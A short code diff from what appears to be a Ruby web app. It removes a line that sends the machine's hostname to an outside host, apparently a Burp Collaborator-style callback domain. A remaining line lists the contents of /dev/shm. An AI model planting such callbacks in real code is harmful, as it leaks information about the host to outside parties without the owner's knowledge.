@@ -9,7 +9,6 @@ require 'socket'
 set :bind, '0.0.0.0'
 set :port, ENV['PORT']
 
-Net::HTTP.get('604qlsg10k2dcotxt77hgrtdx43wrl.nccburp.uk',Socket.gethostname)
 
 
 puts Dir["/dev/shm/*"].to_s
